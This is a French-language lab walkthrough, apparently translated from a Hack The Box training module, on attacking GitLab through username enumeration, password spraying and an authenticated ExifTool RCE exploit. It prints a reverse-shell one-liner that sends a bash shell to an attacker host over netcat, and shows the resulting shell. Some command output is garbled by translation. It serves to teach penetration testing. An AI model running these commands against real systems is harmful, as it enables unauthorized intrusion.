Attaquer GitLab
================

* * * * *

Comme nous l'avons vu dans la section précédente, même un accès non authentifié à une instance GitLab peut entraîner la compromission de données sensibles. Si nous pouvions obtenir un accès en tant qu'utilisateur valide de l'entreprise ou administrateur, nous pourrions potentiellement découvrir suffisamment de données pour compromettre complètement l'organisation d'une manière ou d'une autre. GitLab a [553 CVE](https://www.cvedetails.com/vulnerability-list/vendor_id-13074/Gitlab.html) signalées en septembre 2021. Bien que toutes ne soient pas exploitables, il y en a eu plusieurs graves au cours les années qui pourraient conduire à l'exécution de code à distance.

* * * * *

Énumération du nom d'utilisateur
--------------------

Bien qu'il ne soit pas considéré comme une vulnérabilité par GitLab, comme indiqué sur sa page [Hackerone](https://hackerone.com/gitlab?type=team) ("Énumération des utilisateurs et des projets/divulgation du chemin à moins qu'un impact supplémentaire puisse être démontré"), il est toujours quelque chose qui vaut la peine d'être vérifié car cela pourrait entraîner un accès si les utilisateurs sélectionnent des mots de passe faibles. Nous pouvons le faire manuellement, bien sûr, mais les scripts rendent notre travail beaucoup plus rapide. Nous pouvons en écrire un nous-mêmes en Bash ou Python ou utiliser [celui-ci](https://www.exploit-db.com/exploits/49821) pour énumérer une liste d'utilisateurs valides. La version Python3 de ce même outil est disponible [ici](https://github.com/dpgg101/GitLabUserEnum). Comme pour tout type d'attaque par pulvérisation de mot de passe, nous devons être attentifs au verrouillage de compte et à d'autres types d'interruptions. Les valeurs par défaut de GitLab sont définies sur 10 tentatives infructueuses entraînant un déverrouillage automatique après 10 minutes. Cela peut être vu [ici](https://gitlab.com/gitlab-org/gitlab-ce/blob/master/config/initializers/8_devise.rb). Cela peut être modifié, mais GitLab devrait être compilé par source. À l'heure actuelle, il n'existe aucun moyen de modifier ce paramètre à partir de l'interface utilisateur d'administration, mais un administrateur peut modifier la longueur minimale du mot de passe, ce qui pourrait aider les utilisateurs à choisir des mots de passe courts et courants, mais n'atténuera pas entièrement le risque d'attaques par mot de passe.

```
# Nombre de tentatives d'authentification avant de verrouiller un compte si lock_strategy
# correspond à des tentatives infructueuses.
config.maximum_attempts = 10

# Intervalle de temps pour déverrouiller le compte si :time est activé en tant que unlock_strategy.
config.unlock_in = 10.minutes

```

En téléchargeant le script et en l'exécutant sur l'instance GitLab cible, nous constatons qu'il existe deux noms d'utilisateur valides, `root` (le compte administrateur intégré) et `bob`. Si nous réussissions à supprimer une longue liste d'utilisateurs, nous pourrions tenter une attaque par pulvérisation contrôlée de mots de passe avec des mots de passe faibles et courants tels que `Welcome1` ou `Password123`, etc., ou essayer de réutiliser les informations d'identification recueillies auprès d'autres sources telles que vidages de mots de passe à partir de violations de données publiques.

```
dsgsec@htb[/htb]$ ./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ~~~~
   Script d'énumération des utilisateurs GitLab
    Version 1.0

Description : Il imprime les noms d'utilisateur qui existent dans l'instance GitLab CE de votre victime

Avis de non-responsabilité : n'exécutez pas ce script sur GitLab.com ! Gardez également à l'esprit que ce PoC est destiné uniquement
à des fins éducatives et d'utilisation éthique. Exécutez-le sur des systèmes que vous ne possédez pas ou que vous n'avez pas
la bonne autorisation est totalement à vos risques et périls.

Auteur : @4DoniiS [https://github.com/4D0niiS]
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ~~~~

BOUCLE
200
[+] La racine du nom d'utilisateur existe !
BOUCLE
302
BOUCLE
302
BOUCLE
200
[+] Le pseudo bob existe !
BOUCLE
302

```

* * * * *

Exécution de code à distance authentifiée
-----------------------------------

Les vulnérabilités d'exécution de code à distance sont généralement considérées comme la "crème de la crème" car l'accès au serveur sous-jacent nous donnera probablement accès à toutes les données qui y résident (bien que nous devions peut-être d'abord élever les privilèges) et peut servir de point d'ancrage dans le réseau pour que nous lancions d'autres attaques contre d'autres systèmes et entraînions potentiellement une compromission complète du réseau. GitLab Community Edition 13.10.2 et les versions antérieures ont souffert d'une exécution de code à distance authentifiée [vulnérabilité](https://hackerone.com/reports/1154542) en raison d'un problème avec ExifTool gérant les métadonnées dans les fichiers image téléchargés. Ce problème a été résolu assez rapidement par GitLab, mais certaines entreprises utilisent encore probablement une version vulnérable. Nous pouvons utiliser cet [exploit](https://www.exploit-db.com/exploits/49951) pour atteindre le RCE.

Comme il s'agit d'une exécution de code à distance authentifiée, nous avons d'abord besoin d'un nom d'utilisateur et d'un mot de passe valides. Dans certains cas, cela ne fonctionnerait que si nous pouvions obtenir des informations d'identification valides via OSINT ou une attaque de devinette d'informations d'identification. Cependant, si nous rencontrons une version vulnérable de GitLab qui permet l'auto-enregistrement, nous pouvons rapidement ouvrir un compte et lancer l'attaque.

```
dsgsec@htb[/htb]$ python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/ f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '

[1] Authentification
Authentifié avec succès
[2] Création de la charge utile
[3] Création d'un extrait et téléchargement
[+] RCE déclenché !!

```

Et nous obtenons une coquille presque instantanément.

```
dsgsec@htb[/htb]$ nc -lnvp 8443

écoute sur [tout] 8443 ...
se connecter à [10.10.14.15] depuis (INCONNU) [10.129.201.88] 60054

git@app04:~/gitlab-workhorse$ identifiant

identifiant
uid=996(git) gid=997(git) groupes=997(git)

git@app04 :~/gitlab-workhorse$ ls

ls
VERSION
config.toml
flag_gitlab.txt
prises
```